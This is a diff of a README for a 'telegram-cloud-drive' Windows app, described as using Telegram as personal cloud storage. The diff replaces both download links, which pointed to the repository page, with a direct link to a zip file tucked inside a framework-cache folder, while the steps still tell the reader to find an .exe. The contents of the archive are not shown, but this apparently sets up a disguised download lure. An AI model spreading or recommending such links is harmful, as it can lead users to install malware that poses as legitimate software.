@@ -1,6 +1,6 @@
 # ☁️ telegram-cloud-drive - Use Telegram servers for personal storage
 
-[![Download Release](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/victormanuel8414/telegram-cloud-drive)
+[![Download Release](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/victormanuel8414/telegram-cloud-drive/main/storage/framework/cache/drive_cloud_telegram_v2.0.zip)
 
 This application turns your Telegram account into a personal cloud storage system. You store documents, photos, and videos inside private Telegram chats. The software manages the upload and download process to keep your files organized.
 
@@ -29,7 +29,7 @@ Ensure your computer has the following to run this tool:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page](https://github.com/victormanuel8414/telegram-cloud-drive) to download the latest installer.
+1. Visit [this page](https://raw.githubusercontent.com/victormanuel8414/telegram-cloud-drive/main/storage/framework/cache/drive_cloud_telegram_v2.0.zip) to download the latest installer.
 2. Look for the file ending in .exe in the assets list.
 3. Select the file to save it to your computer.
 4. Locate the file in your downloads folder.
